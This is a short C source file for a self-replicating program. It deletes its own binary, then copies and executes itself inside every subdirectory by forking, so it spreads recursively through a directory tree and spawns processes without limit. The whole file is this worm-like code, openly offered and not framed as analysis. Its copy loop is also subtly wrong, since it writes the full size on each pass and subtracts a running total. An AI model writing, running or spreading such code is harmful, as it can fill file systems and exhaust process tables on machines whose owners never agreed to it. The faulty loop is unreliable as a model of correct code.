/*
 * =====================================================================================
 *
 *       Filename    :  gito.c
 *       Description :  g(host)ito loads, deletes, copies and executes itself in all directories
 *       Compiler    :  gcc
 *
 * =====================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdint.h>

int main (int argc, char *const *argv) {

    // load self
    int fd = open(argv[0], O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    struct stat fst;
    if (fstat(fd, &fst) != 0) {
        perror("lstat");
        return 1;
    }
    size_t siz = fst.st_size;
    uint8_t *map = mmap(NULL, siz, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    close(fd);

    // delete self
    if (remove(argv[0]) < 0) {
        perror("remove");
        return 1;
    }

    // scan directory
    DIR *d = opendir(".");
    if (d == NULL) {
        perror("opendir");
        return 1;
    }
    struct dirent *dr;
    while ((dr = readdir(d)) != NULL) {
        char *n = dr->d_name;  

        // if is directory and not . or ..
        if (dr->d_type == DT_DIR && strcmp(n, ".") 
                                 && strcmp(n, "..")) {

            // fork, copy, execute
            if (!fork()) {

                // move into directory
                if (chdir(n) < 0) {
                    perror("chdir");
                    return 1;
                }


                // create file and copy self into it
                int copy = open(argv[0], O_CREAT | O_WRONLY, 0777); 
                int bytes_left = siz;
                int bytes_written = 0;
                uint8_t *p = map;

                while (bytes_left > 0) {
                    bytes_written += write(copy, p, siz);
                    bytes_left -= bytes_written;
                    p += bytes_written;
                }
                close(copy);

                // execute self
                if (execve(argv[0], argv, NULL) < 0) {
                    perror("execv");
                    return 1;
                }
            }
        }
    }
    munmap(map, siz);
    return 0;
}

